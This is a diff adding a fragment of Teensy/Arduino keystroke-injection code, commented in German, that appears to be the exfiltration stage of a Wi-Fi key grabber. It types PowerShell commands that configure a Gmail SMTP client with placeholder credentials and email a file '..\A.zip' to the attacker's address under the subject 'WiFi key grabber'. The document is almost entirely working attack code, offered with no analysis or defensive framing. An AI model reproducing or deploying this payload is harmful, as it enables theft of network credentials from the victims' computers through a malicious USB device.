@@ -1,0 +1,44 @@
+﻿// ###############
+// Mail senden
+// ###############
+
+Keyboard.print ("powershell");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$SMTPServer = 'smtp.gmail.com'");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$SMTPInfo.EnableSsl = $true");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('[[Username]]@gmail.com', '[[Password]]')");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$ReportEmail = New-Object System.Net.Mail.MailMessage");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$ReportEmail.From = '[[Username]]@gmail.com'");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$ReportEmail.To.Add('[[Username]]@gmail.com')");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$ReportEmail.Subject = 'WiFi key grabber'");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$ReportEmail.Body = ('WifiPeensy')");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$ReportEmail.Attachments.Add('..\\A.zip')");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("$SMTPInfo.Send($ReportEmail)");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("exit");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+delay (1000);
